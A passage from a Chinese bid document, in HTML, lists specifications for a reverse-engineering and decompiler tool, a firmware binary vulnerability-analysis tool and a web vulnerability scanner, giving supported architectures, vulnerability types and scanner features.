Decompiler的支持，展现了工具的专业性和适应性。</p><h3 id="产品彩页-30"><a href="#产品彩页-30" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5164991c342890c43a0e7353c1deedf2.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/55d06871832ec3e4d0226201c94b1660.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/540901b8e27d68ccb59e79dd88ec2ed2.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/006765a3e4d66206f4734f582a74a35e.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/81cbcc597d3184935843b925bdb5b687.png"></p><h3 id="工具参数-23"><a href="#工具参数-23" class="headerlink" title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该工具信息如下：</p><p>品牌：国利</p><p>型号：GLBINcc</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li><p>支持 50 多种架构binary文件，而且支持 64 位文件；</p></li><li><p>支持的操作系统包括：Windows、Linux、Mac；</p></li><li><p>支持数十种CPU指令集反编译：</p><p>x64 architecture (Intel x64 and AMD64)</p><p>ARM64 Architecture (aka AArch64)</p><p>ARMv8-A: Cortex-A50/Cortex-A53/Cortex-A57</p><p>ARMv8 (custom): Apple A7 (Cyclone microarchitecture, used in iPhone 5s)</p><p>Analog Devices AD218x series (ADSP-2181, ADSP-2183, ADSP-2184(L/N), ADSP-2185(L/M/N), ADSP-2186(L/M/N), ADSP-2187(L/N), ADSP-2188M/N, ADSP-2189M/N)</p><p>Dalvik (Android bytecode, DEX)</p><p>DEC Alpha</p><p>DSP563xx, DSP566xx, DSP561XX (comes with source code)</p><p>TI TMS320C2X, TMS320C5X, TMS320C6X, TMS320C64X, TMS 320C54xx, TMS320C55xx, TMS320C3 (comes with source code)</p><p>TI TMS320C27x/TMS320C28x</p><p>Hewlett-Packard HP-PA (comes with source code)</p><p>Hitachi/Renesas SuperH series: SH1, SH2, SH3, Hitachi SH4 (Dreamcast), SH-4A, SH-2A, SH2A-FPU</p><p>IBM/Motorola PowerPC/POWER architecture, including Power ISA extensions:</p><p>Book E (Embedded Controller Instructions)</p><p>Freescale ISA extentions (isel etc.)</p><p>SPE (Signal Processing Engine) instructions</p><p>AltiVec (SIMD) instructions</p><p>Hypervisor and virtualization instructions</p><p>All instructions from the Power ISA 2.06 specification (Vector, Decimal Floating Point, Integer Multiply-Accumulate, VSX etc.)</p><p>Cell BE (Broadband Engine) instructions (used in PlayStation 3)</p><p>VLE (Variable Length Encoding) compressed instruction set</p><p>Xenon (Xbox 360) instructions, including VMX128 extension</p><p>Paired Single SIMD instructions (PowerPC 750CL/Gekko/Broadway/Espresso, used in Nintendo Wii and WiiU)</p><p>Motorola/Freescale PowerPC-based cores and processors, including (but not limited to):</p><p>MPC5xx series: MPC533/MPC535/MPC555/MPC556/MPC561/MPC562/MPC563/MPC564/MPC566</p><p>Note: code compression features of MPC534/MPC564/MPC556/MPC566 (Burst Buffer Controller) are currently not supported</p><p>MPC8xx series (PowerQUICC): MPC821/MPC850/MPC860</p><p>MPC8xxx series (PowerQUICC II, PowerQUICC II Pro, PowerQUICC III): MPC82xx/MPC83xx/MPC85xx/MPC87xx</p><p>MPC5xxx series (Qorivva): MPC55xx, MPC56xx, MPC57xx</p><p>Power PC 4xx, 6xx, 74xx, e200 (including e200z0 with VLE), e500 (including e500v1, e500v2 and e500mc), e600, e700, e5500, e6500 cores</p><p>QorIQ series: P1, P2, P3, P4, P5 and T1, T2, T4 families</p><p>Infineon Tricore architecture (up to architecture v1.6)</p><p>Intel IA-64 Architecture - Itanium.</p><p>Motorola DSP 56K</p><p>Motorola MC6816</p><p>MIPS</p><p>MIPS Mark I (R2000)</p><p>MIPS Mark II (R3000)</p><p>MIPS Mark III: (R4000, R4200, R4300, R4400, and R4600)</p><p>MIPS Mark IV: R8000, R10000, R5900 (Playstation 2)</p><p>MIPS32, MIPS32r2, MIPS32r3 and MIPS64, MIPS64r2, MIPS64r3</p><p>Allegrex CPU (Playstation Portable), including VFPU instructions</p><p>Cavium Octeon ISA extensions</p><p>MIPS16 (MIPS16e) Application Specific Extension</p><p>MIPS-MT, MIPS-3D, smartMIPS Application Specific Extensions</p><p>Toshiba TX19/TX19A Family Application Specific Extension (MIPS16e+ aka MIPS16e-TX)</p><p>Mitsubishi M32R(comes with source code)</p><p>Mitsubishi M7700 (comes with source code)</p><p>Mitsubishi M7900 (comes with source code)</p><p>Nec 78K0 and Nec 78K0S (comes with source code)</p><p>STMicroelectronics ST9+, ST-10 (comes with source code)</p><p>SPARCII, ULTRASPARC</p><p>Siemens C166 (flow)</p><p>Fujitsu F2MC-16L, Fujitsu F2MC-LC (comes with source code)</p><p>16-bit Microchip PIC series (PIC24, dsPIC: PIC24XX, PIC30XX, PIC33XX)</p></li><li><p>支持WinDbg 和 Symbian 调试器</p></li><li><p>支持使用debugserver协议来与设备建立连接。</p></li><li><p>支持交互式、可编程的多处理器反汇编器。</p></li><li><p>需要支持FAT文件系统（文件访问表）。</p></li><li><p>需要支持交互性（重构，重命名，评论）。</p></li><li><p>需要支持图形化（CFG，Callgraphs）。</p></li><li><p>需要支持支持同一项目中的多个工件。</p></li><li><p>需要支持扩展 - Python中的客户端脚本。</p></li><li><p>需要支持扩展（插件和脚本）。</p></li><li><p>需要支持没有互联网连接的情况下正常工作。</p></li><li><p>需要支持执行第三方前端客户端。</p></li><li><p>支持Intel x86调试器（GDB / LLDB所有平台，包括Android）</p></li><li><p>支持Intel x86-64调试器（GDB / LLDB所有平台，包括Android）。</p></li><li><p>支持ARM调试器（GDB / LLDB所有平台，包括Android）。</p></li><li><p>支持ARM64调试器（GDB / LLDB所有平台，包括Android）。</p></li><li><p>支持MIPS调试器（GDB / LLDB所有平台，包括Android）。</p></li><li><p>支持Intel x86调试器（GDB / LLDB所有平台，包括Android）。</p></li><li><p>固件代码逆向测试工具应具备良好的交互性，具备可编程性、可扩展性，支持多处理器、交叉Windows或Linux WinCE平台主机。</p></li><li><p>固件代码逆向测试工具能够支持CPU指令集至少包括Intel x86、x64、MIPS、PowerPC、ARM、Z80、68000、c8051。</p></li><li><p>固件代码逆向测试工具应具备二进制搜索、动态调试、流程图功能。</p></li><li><p>通用平台逆向工具支持瑞萨RH850指令集。</p></li><li><p>通用平台逆向工具支持扫描目标文件的常见文件签名。</p></li><li><p>通用平台逆向工具支持扫描目标文件的指定字符序列。</p></li><li><p>通用平台逆向工具支持扫描目标文件中常见可执行代码。</p></li><li><p>通用平台逆向工具支持指定要使用的自定义魔术签名文件。</p></li><li><p>通用平台逆向工具支持自动提取已知的文件类型。</p></li><li><p>通用平台逆向工具支持提取文件/文件夹到自定义目录。</p></li><li><p>通用平台逆向工具支持限制每个提取的文件大小。</p></li><li><p>通用平台逆向工具支持限制提取文件的数量。</p></li><li><p>通用平台逆向工具支持从文件中读取数据，但不执行提取使用程序。</p></li><li><p>通用平台逆向工具支持扫描原始deflate压缩流。</p></li><li><p>通用平台逆向工具支持扫描原始LZMA压缩流。</p></li><li><p>通用平台逆向工具支持只扫描名称与此正则表达式匹配的文件</p></li><li><p>通用平台逆向工具支持不扫描名称与此正则表达式匹配的文件。</p></li><li><p>通用平台逆向工具支持启用指定端口上的状态服务器。</p></li><li><p>支持Dalvik Decompiler。</p></li><li><p>支持ARM反编译器。</p></li><li><p>支持ARM64反编译器。</p></li><li><p>支持MIPS反编译器。</p></li><li><p>支持Intel x86 Decompiler。</p></li><li><p>支持Intel x86-64 Decompiler。</p></li><li><p>支持用于libravm / Move模块的Libra Decompiler（开源）。</p></li><li><p>支持存档文件（zip，7z，tar）。</p></li><li><p>支持证书文件（x.509）。</p></li><li><p>支持Android APK（包括dex，odex，x-apk）。</p></li><li><p>支持Windows PE / PE64 / COFF，PDB。</p></li><li><p>支持Linux ELF / ELF64。</p></li><li><p>支持Mach-O，Mach-O / FAT。</p></li><li><p>支持英特尔HEX（ihex）。</p></li><li><p>支持Dalvik调试器（Android）。</p></li><li><p>支持软件license和数据库三年之内免费升级。</p></li></ol><h2 id="二进制分析工具"><a href="#二进制分析工具" class="headerlink" title="二进制分析工具"></a>二进制分析工具</h2><h3 id="工具概述-24"><a href="#工具概述-24" class="headerlink" title="工具概述"></a>工具概述</h3><p>所投工具能帮助企业为引入第三方组件设置管理门槛及策略。支持基于尖端的已知和未知漏洞检测引擎，查找和验证实际的安全威胁。能够基于机器自学习算法技术根据CWE规范提取所有漏洞的特征（调用堆栈，方法名称，参数类型，缓冲区大小等）自动生成该二进制文件的未知漏洞列表。</p><h3 id="工具方案-24"><a href="#工具方案-24" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="软件方案-24"><a href="#软件方案-24" class="headerlink" title="软件方案"></a>软件方案</h4><p>仪表盘：设计一个清晰的主仪表盘，展示所有安全分析的总体状态，包括漏洞数量、风险等级分布、最近扫描活动等。</p><p>导航：提供直观的顶部导航栏，让用户能够快速访问不同的功能模块，例如“成分分析”、“漏洞扫描”、“风险评估”等。</p><p>向导和帮助：对于复杂的操作，提供交互式向导和步骤说明，帮助用户完成任务。</p><p>成分分析：用户能够上传或指定代码库进行分析，并能接收到一个详细的成分列表报告。</p><p>漏洞扫描：通过点击“漏洞扫描”按钮允许用户快速启动漏洞扫描过程。用户可以选择扫描特定的文件、目录或整个项目。</p><p>语言缺陷分析：提供语言选择器，允许用户指定或自动检测其代码的编程语言。展示语言特定的缺陷和安全问题的清单。</p><p>风险评估：提供交互式的风险评估工具，用户可以通过拖放组件来构建系统架构，并自动进行风险评估。</p><p>漏洞管理：实现一个漏洞管理界面，用户可以查看各个漏洞的详细信息，包括评分、描述、修复建议等。用户可以根据漏洞的严重程度、状态（已解决/未解决）、影响组件等条件过滤漏洞。</p><p>报告和输出：提供一键生成报告功能，用户可以导出PDF或其他格式的详细分析报告。支持定制报告模板，以符合组织的品牌和格式要求。</p><p>集成和API：提供开放的API接口，允许用户将工具集成到他们的CI/CD流程中。支持与常见的代码仓库和问题跟踪系统集成，如GitHub、GitLab、JIRA等。</p><p>配置文件：允许用户创建和保存配置文件，以便于在不同项目间复用特定的扫描设置。用户可以快速选择已有的配置文件来执行新的扫描任务。</p><p>通知设置：用户可以设置通知偏好，选择在发现新漏洞或漏洞状态变更时接收邮件、短信或系统通知。</p><p>用户账户和角色管理：支持用户账户创建和管理，允许不同的用户拥有不同的访问权限。管理员可以分配角色和权限，控制用户对各种功能的访问。</p><p>数据加密：确保所有敏感数据，如源代码、漏洞信息、配置设置等都经过加密处理。</p><p>安全审计：提供审计日志，记录所有用户的活动和系统事件，以供未来审查。</p><h4 id="工具功能-24"><a href="#工具功能-24" class="headerlink" title="工具功能"></a>工具功能</h4><p>成分分析:本工具能够通过深度扫描和分析技术自动生成软件物料清单（SBOM）和硬件物料清单（HBOM），为用户提供详尽的组件清单和硬件资源使用情况。SBOM包括所有软件组件的名称、版本、许可信息，以及这些组件的依赖关系。HBOM详细列出硬件组件的规格、型号、供应商信息以及相关的固件版本。</p><p>公有漏洞扫描:工具将支持对二进制固件及应用程序的成分分析，自动化地匹配并发现与之相关的公有漏洞（CVEs）。通过集成最新的公有漏洞数据库，工具能够实时更新和识别新发现的漏洞。</p><p>语言缺陷分析:支持广泛的编程语言进行缺陷分析，包括但不限于Assembly, BASIC, C, C++, Delphi, Go, Haskell, Java, Lisp, OCaml, Objective-C, Qt, Rust, Swift, Python, Javascript等。工具将使用先进的静态和动态分析技术，识别各种编程语言特有的安全缺陷和代码质量问题。</p><p>架构支持:本工具设计以支持多种处理器和微控制器架构，包括但不限于Renesas V850, SuperH, PowerPC, Infineon, Tricore, ARM Cortex系列，x86/x64, NVIDIA AGX, Xavier, MIPS, NXP等。对于每种架构，工具都能够提供定制化的分析和识别能力，确保准确性和效率。</p><p>系统支持:工具将支持包括但不限于Standard Linux Distribution, Android, QNX, Windows, Windows IoTs, NetBSD, FreeBSD, Proprietary RTOS, RIOT, Fuchsia OS, OSEK OS, VxWorks, webOS等多种操作系统。通过深入了解各系统的内核和API特性，工具能够提供针对性的安全分析。</p><p>接口风险分析:工具将支持对包括蓝牙、WiFi、SMS、4G、GPS等多种协议接口进行安全风险分析。通过模拟攻击和协议分析，工具能够发现和报告潜在的协议接口相关的公有漏洞。</p><p>AUTOSAR架构识别:工具能够识别基于AUTOSAR架构的固件，并自动绘制出AUTOSAR架构的拓扑图。帮助汽车行业的开发者和安全分析师快速理解系统架构和组件交互。</p><p>TARA分析:支持结合SBOM资产类型和维度进行整车拓扑结构的自定义，并进行威胁分析和风险评估（TARA）。工具提供可视化界面，帮助用户直观地理解和分析整个系统的安全风险。</p><p>漏洞过滤机制:能够对已知漏洞进行威胁关联分析，排除对系统固件不受影响的已知漏洞。工具将包含不少于22种不同的漏洞过滤条件，如版本匹配、配置状态、影响评估等。</p><p>信息泄露风险:工具能够识别硬编码凭证、明文纯文本密码、哈希密码、潜在邮箱、IPs、URLs、文件路径等敏感信息泄露风险。对于加密相关的风险，工具将识别可访问的加密密钥、未加密的对外通讯、私有密钥等弱加密配置。</p><p>漏洞利用脚本:工具将标识已知漏洞的可利用状态（EXP）并提供相关的漏洞利用脚本链接。这将帮助安全研究人员和开发者了解漏洞的实际利用方法和风险程度。</p><p>漏洞评分:提供漏洞的通用漏洞评分系统（CVSS）评分，支持CVSSv2和CVSSv3标准。通过评分，用户可以快速识别和优先处理高风险的漏洞。</p><p>漏洞缺陷类型:能够将公有漏洞匹配对应的漏洞缺陷类型（CWE），帮助用户理解漏洞的本质和潜在影响。</p><p>开源许可风险:工具将分析组件的开源许可类型，并支持不少于50种不同的开源许可类型。用户可以根据许可类型评估法律风险和合规性要求。</p><p>漏洞修复建议:提供详细的漏洞修复建议或补丁链接，帮助用户快速响应和修复漏洞。</p><p>未知漏洞挖掘能力:无需源代码，工具能够对二进制固件进行自动化逆向工程和反汇编，以发掘未知漏洞。通过高级算法和模式识别技术，工具能够识别潜在的安全风险。</p><p>未知漏洞缺陷类型:支持对多种未知漏洞缺陷类型进行挖掘，包括但不限于缓冲区溢出、缓冲区重读、无效缺页错误、死锁、整数溢出、空指针间接引用、未初始化数据、释放后使用、双重释放、释放无效内存地址、除数为零、类型混淆等。</p><p>未知漏洞风险分类:能够对未知漏洞的风险进行分类，包括远程代码执行（RCE）、权限提升（PE）、拒绝服务（DOS）等。</p><p>未知漏洞描述:结合二进制文件和对应的反汇编信息，为每个未知漏洞生成详细的描述。</p><p>缓解措施:支持上传符号文件，以帮助用户定位未知漏洞，并提供修复和缓解建议。</p><p>自动生成未知漏洞代码验证:能够基于二进制固件的函数和汇编信息自动生成未知漏洞缺陷代码进行验证。</p><p>漏洞定位:提供与未知漏洞相关的二进制反汇编信息，以便用户进行漏洞定位与修复。</p><p>合规标准检测:能对固件和应用进行合规审查，支持50种以上不同行业的标准与规范。</p><p>持续监控:对漏洞结果进行持续跟踪，并基于国际漏洞库、论坛、新闻等多方渠道进行潜在风险的持续跟踪，同时提供实时告警。</p><h3 id="产品彩页-31"><a href="#产品彩页-31" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4de27bebf49c380d4e1ec11b17684602.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/4e841afcb363e8a28770849429bc49bf.png"></p><h3 id="工具参数-24"><a href="#工具参数-24" class="headerlink" title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该工具信息如下：</p><p>品牌：国利</p><p>型号：GLRNPcc</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>成分分析：能够自动生成对应的软件物料清单(SBOM), 硬件物料清单(HBOM)；</li><li>公有漏洞扫描：支持针对二进制固件与应用进行成分分析, 同时自动化的匹配发现公有漏洞(CVEs)；</li><li>语言缺陷分析：支持Assembly, BASIC, C, C++, Delphi, Go, Haskell, Java, Lisp, OCaml, Objective-C, Qt, Rust, Swift, Python, Javascript等语言缺陷识别；</li><li>架构支持：支持Renesas V850, SuperH, PowerPC, Infineon, Tricore, ARM Cortex -M, ARM Cortex -A, ARM Cortex -R, x86, x64, NVIDIA AGX, Xavier, MIPS, NXP等架构；</li><li>系统支持：支持Standard Linux Distribution, Android, QNX, Windows, Windows IOTs, NetBSD, FreeBSD, Proprietary RTOS, RIOT, Fuchsia OS, OSEK OS, VxWorks, webOS等系统；</li><li>接口风险分析：支持通过检测发现潜在的协议接口相关的公有漏洞, 其中包括蓝牙, WiFi, SMS, 4G, GPS等不同协议接口；</li><li>AUTOSAR架构识别：能够识别固件是否基于AUTOSAR架构, 并自动绘制AUTOSAR架构拓扑图；</li><li>TARA分析：支持通过可视化的方式，结合SBOM的资产类型和纬度进行整车拓扑结构的定制，并进行TARA分析；</li><li>漏洞过滤机制：能对已知漏洞进行威胁关联分析，排除对系统固件不受影响的已知漏洞, 同时包含22种不同的漏洞过滤条件；</li><li>信息泄露风险：硬编码凭证、明文纯文本密码、哈希密码、潜在邮箱，IPs, URLs，文件路径、验证加密问题和弱加密配置：可访问的加密密钥、未加密的对外通讯、私有密钥；</li><li>漏洞利用脚本：能够标识已知漏洞的可利用状态（EXP）并提供脚本链接；</li><li>漏洞评分：提供漏洞的CVSS评分，支持CVSSv2和CVSSv3；</li><li>漏洞缺陷类型：能够匹配公有漏洞对应的漏洞缺陷类型(CWE)；</li><li>开源许可风险：能分析组件的开源许可类型, 同时支持50种不同的开源许可类型；</li><li>漏洞修复建议：提供漏洞的详细修复建议或补丁链接；</li><li>未知漏洞挖掘能力：无需获取源代码, 能够对二进制固件进行自动化逆向与反汇编, 并找到相应的未知漏洞；</li><li>未知漏洞缺陷类型，支持针对缺陷类型的未知漏洞挖掘：</li></ol><p>Buffer overflow - Heap/Stack 缓冲区溢出 - 堆/堆栈</p><p>Buffer over-read - Heap/Stack 缓冲区重读 - 堆/堆栈</p><p>Invalid page fault 无效缺页错误缺陷</p><p>Deadlock 死锁</p><p>Integer overflow 整数溢出</p><p>Null pointer dereference 空指针间接引用缺陷</p><p>Uninitialized data 未初始化变量缺陷</p><p>Use-after-free 释放后使用缺陷</p><p>Double free 双重释放缺陷</p><p>Invalid and mismatched free 释放无效内存地址缺陷</p><p>Divisions by zero 除数为零缺陷</p><p>Type Confusion 类型混淆缺陷</p><ol><li>未知漏洞风险分类，能够针对未知漏洞的风险进行分类：</li></ol><p>RCE (Remote Code Execution)</p><p>PE (Privilege Escalation)</p><p>DOS (Denial of Service)</p><ol><li>未知漏洞描述：针对每个未知漏洞，结合二进制文件和对应的反汇编信息，生成对应的漏洞描述；</li><li>缓解措施：支持通过上传符号文件，进行对应的未知漏洞定位，从而帮助用户进行未知漏洞修复和缓解；</li><li>自动生成未知漏洞代码验证：能够自动基于二进制固件的函数和汇编信息生成未知漏洞缺陷代码进行验证；</li><li>漏洞定位：提供与未知漏洞相关的二进制反汇编信息，方便用户进行未知漏洞定位与修复；</li><li>合规标准检测：能对固件和应用进行合规审查，支持50种以上的不同行业的标准与规范；</li><li>持续监控：对漏洞结果进行持续跟踪, 并自动基于国际漏洞库, 论坛, 新闻等多方渠道进行潜在风险的持续跟踪,并进行告警；</li><li>支持软件license和数据库三年之内免费升级。</li></ol><h2 id="Web漏洞扫描工具"><a href="#Web漏洞扫描工具" class="headerlink" title="Web漏洞扫描工具"></a>Web漏洞扫描工具</h2><h3 id="工具概述-25"><a href="#工具概述-25" class="headerlink" title="工具概述"></a>工具概述</h3><p>漏洞扫描是一款针对设备入网、网站上线、日常运维、安全事件脆弱点分析、等保合规等场景提供的一体化脆弱性分析与评估产品。能够为党政、卫生、教育、监管、能源、金融等行业用户提供涵盖系统漏洞检测、web漏洞检测、数据库漏洞检测、配置合规检测、弱口令检测在内的五合一脆弱性检测能力。</p><h3 id="工具方案-25"><a href="#工具方案-25" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="软件方案-25"><a href="#软件方案-25" class="headerlink" title="软件方案"></a>软件方案</h4><p>1. 系统架构</p><p>本漏洞扫描工具采用B/S架构，以支持无客户端部署，通过Web界面管理所有操作。后端采用分布式系统设计，支持在多个数据中心中部署扫描引擎，实现负载均衡和高可用性。管理服务器将部署在主数据中心，扫描引擎可以部署在各个地理位置的数据中心中，以实现本地化扫描和数据隔离。</p><p>2. 系统部署</p><p>管理服务器：部署在机房A，负责策略下发、结果汇总、用户管理、日志记录等集中管理功能。</p><p>扫描引擎：分布式部署在机房B/C/D等，每个引擎可独立完成扫描任务。</p><p>3. 安全和认证</p><p>所有Web管理界面使用HTTPS协议加密。</p><p>支持多种认证方式，包括Cookie/Session、Form、Basic、NTLM、Digest和SSL证书认证。</p><p>4. 用户管理</p><p>支持自定义用户账号，包括系统管理员、配置管理员、审计管理员、报表管理员等角色。</p><p>用户信息包括用户名、权限模板、最近登录日期和时间、账号状态、登录超时时间等。</p><p>支持用户权限模板自定义，具体权限细节可查看。</p><p>5. 扫描功能</p><p>支持IPv4和IPv6环境的漏洞扫描。</p><p>支持自定义扫描任务，包括系统扫描、Web扫描、数据库扫描、弱口令扫描和安全基线检测。</p><p>支持多种扫描策略，包括危险测试、口令破解、规则检测等。</p><p>6. 通知与报告</p><p>检测完成后支持发送报告至指定邮箱、SNMP Trap、SYSLOG、FTP服务器。</p><p>支持自定义告警内容、方式和资产范围。</p><p>7. 系统维护与诊断</p><p>支持系统资源监控和告警设置。</p><p>提供PING、WGET、端口探测等基本诊断工具。</p><p>支持Tcpdump抓包功能。</p><p>支持一键诊断和修复常见问题。</p><p>8. 扩展性和兼容性</p><p>与微软WSUS补丁系统联动。</p><p>支持主流操作系统、网络设备、安全设备、移动设备、虚拟化环境、国产操作系统和数据库漏洞扫描。</p><p>9. 资产管理</p><p>支持资产自动发现、增加、删除和标签管理。</p><p>支持资产组的创建、编辑和删除。</p><p>支持资产风险情况筛选查询和导出。</p><p>10. 报表和审计</p><p>支持多种报表格式，包括Excel、Word、HTML、PDF、XML。</p><p>支持自定义报表内容和公司信息。</p><p>支持历史报表的查询和管理。</p><h4 id="工具功能-25"><a href="#工具功能-25" class="headerlink" title="工具功能"></a>工具功能</h4><p>1.用户和账号管理：</p><p>支持修改账号密码，保障账户安全性。</p><p>支持自定义创建账号，包含系统管理员、配置管理员、审计管理员、报表管理员四种用户角色。</p><p>提供用户信息查看，包括用户名、用户权限模板、最近登录日期和时间、账号状态、是否被锁定、登录超时时间等。</p><p>支持新增用户信息设置，如登录锁定次数、是否需要定期更换密码、最小密码长度、密码强度要求等。</p><p>支持自定义用户权限模板，包括报表管理员功能组、审计管理员功能组、普通管理员功能组等，并能查看权限模板详情。</p><p>2.扫描引擎和任务管理：</p><p>支持将当前设备设置为分布式引擎，并支持新增引擎地址、查看分布式引擎基本信息。</p><p>支持新增系统扫描、Web扫描、数据库扫描、弱口令、安全基线检测扫描任务，可独立弱口令扫描任务下发。</p><p>支持删除现有任务列表下的任意任务。</p><p>支持编辑任务的执行方式、策略、告警等选项。</p><p>支持任务复制功能，以快速生成相同任务，并支持编辑复制的任务。</p><p>3.诊断和维护工具：</p><p>支持PING、WGET、端口探测等基本诊断工具，确保网络畅通。</p><p>支持端口探测工具快速探测端口开放状态。</p><p>支持遍历数据包传输路径上的所有路由器。</p><p>支持通过Tcpdump进行抓包分析。</p><p>支持针对引擎、服务的常见问题，提供一键诊断和修复功能。</p><p>4.系统和服务配置：</p><p>支持界面配置反向支持端口，简化售后支持。</p><p>支持开启和关闭SSH服务，以及解锁SSH远程使用。</p><p>支持新增、删除系统登录信息，包括手动输入或批量导入，及登录信息的批量验证。</p><p>5.扫描策略和选项：</p><p>支持最大限度报告漏洞，选择是否报告所有可能存在的漏洞。</p><p>支持执行所有规则检测，不考虑开启的服务，挨个使用插件检测。</p><p>支持执行危险测试，如拒绝服务检测。</p><p>支持启用口令破解，进行弱口令相关检测。</p><p>支持测试Oracle账号的口令破解。</p><p>6.扫描引擎配置：</p><p>支持设置插件超时时间，避免长时间占用资源。</p><p>支持设置单个主机检测并发数，提升扫描效率。</p><p>支持设置单个扫描任务并发主机数，优化资源使用。</p><p>支持设置单个主机TCP连接数，保证连接稳定性。</p><p>7.漏洞扫描和补丁管理：</p><p>支持和微软WSUS补丁系统联动，自动化补丁修补。</p><p>8.认证和会话管理：</p><p>支持多种Web认证方式，如Cookie/Session、Form认证、Basic认证、NTLM认证、Digest认证和SSL证书认证。</p><p>9.Web扫描配置：</p><p>支持设置起始URL、其它URL、网站域名、扫描根目录例外url等。</p><p>支持设置并发线程数，优化扫描性能。</p><p>支持区分URL中的字母大小写，确保精确扫描。</p><p>支持设置引擎保留的相似链接数量最大值。</p><p>支持设置引擎在归并链接时，同一目录下需要保留的链接数量。</p><p>支持设置链接无法访问时的重试次数。</p><p>支持设置访问链接时的超时时间。</p><p>支持设置单个网站扫描的超时时间，默认为0限制。</p><p>10.代理和木马检测：</p><p>支持选择代理类型，包括HTTP和SOCKS，以便访问目标网站。</p><p>支持开启暗链检测，发现网站中的隐藏链接。</p><p>支持开启网站木马检测，检测恶意脚本。</p><p>11.爬虫和页面爬取配置：</p><p>支持设置检测深度，控制爬虫爬取页面的深度。</p><p>支持选择爬虫策略，广度优先或深度优先。</p><p>支持设置HTTP请求头，模拟浏览器的UserAgent。</p><p>支持设置爬虫模拟提交时填充的表单内容。</p><p>支持设置爬取的最大页面数。</p><p>支持设置爬取页面的最大KB数。</p><p>12.弱口令和服务检测：</p><p>支持选择口令猜解服务类型，支持多选。</p><p>支持多种服务和数据库的弱口令检测，如TELNET、FTP、SSH、Oracle、MySQL等。</p><p>支持常见摄像头类型的弱口令检测。</p><p>支持使用字典的标准模式和组合模式。</p><p>支持设置最大线程并发数，优化口令猜解速度。</p><p>13.任务下发和安全基线检测：</p><p>支持在线下发任务和离线下发任务。</p><p>支持手动添加、使用资产、批量添加创建安全基线检测任务。</p><p>支持对Windows、Linux等操作系统通过登录方式检测其漏洞安全基线。</p><p>14.安全配置规范和数据库漏洞检测：</p><p>支持移动、电信、公安部、工信部安全配置规范。</p><p>支持主流数据库漏洞的检测，如Oracle、MySQL、Postgres等。</p><p>支持数据库登录扫描，包括目标地址、端口、数据库账号等设置。</p><p>15.任务和报告管理：</p><p>支持查看任务种类、进行状态，区分新增、已修复、误报等状态。</p><p>支持查看不同类型任务的执行状态、进度、剩余时间、风险分布等。</p><p>支持查看所有正在执行的任务。</p><p>支持通过任务的时间、状态和关键词检索查找任务。</p><p>支持导出和在线查看已完成任务的报表。</p><p>16.资产管理和漏洞库：</p><p>支持以树形结构显示资产，进行操作和显示资产总数。</p><p>支持单独和批量增加资产，包括上传Excel格式文件。</p><p>支持资产自动发现功能。</p><p>支持单独和批量删除资产。</p><p>支持系统漏洞库，并按照漏洞类别及威胁程度分类。</p><p>17.兼容性和扫描模板：</p><p>支持各种操作系统、网络设备、安全设备、移动设备、虚拟化环境和数据库的漏洞扫描。</p><p>支持自定义系统扫描模板，包括自定义模板名字、查询条件和漏洞插件。</p><p>18.OWASP Top10和风险管理：</p><p>支持基于OWASP Top10标准进行Web漏洞扫描检测规则定义。</p><p>支持资产属性、资产组、漏洞等级等进行资产风险情况筛选查询并导出结果。</p><p>19.报表和统计：</p><p>支持常见报表格式，包括Excel、Word、HTML、PDF、XML。</p><p>支持自定义报表的公司信息。</p><p>支持自定义导出检测详情。</p><p>支持根据漏洞状态筛选导出报表。</p><p>支持历史导出报表的总览、查询及管理。</p><h3 id="产品彩页-32"><a href="#产品彩页-32" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c2ca4e2c4c8c026a43f8d388e9990412.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/eb26c816c739f6f522f04de345d1e0c0.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/11fd8f2f97b2fc70d4988f3344dd5b51.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/1afc86ac7f5b548a59e7c1ab951ee8b7.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/69db78bd87a9c0f7151ec9b88fc04bf6.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/70be66e744632b95ca4f00d34abda46c.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/22962074bf37b50bb8c15bb6828a9700.png"></p><h3 id="工具参数-25"><a href="#工具参数-25" class="headerlink" title="工具参数"></a>工具参数</h3><ol><li>支持多个系统分布式集中部署，统一下发策略、统一查看结果，指定扫描引擎；支持分布式引擎。</li><li>支持集中管理：包括日志查看、策略管理、站点管理，可配置告警内容、告警方式、告警资产范围。</li><li>支持集中管理服务器和扫描引擎分地域部署。如管理中心部署在机房A，机房B/C/D可只部署扫描引擎。扩展性较强。</li><li>单个设备旁路部署，能够独立完成扫描工作。</li><li>采用B/S设计架构，无需安装客户端，Web管理采用HTTPS协议，推荐使用Firefox 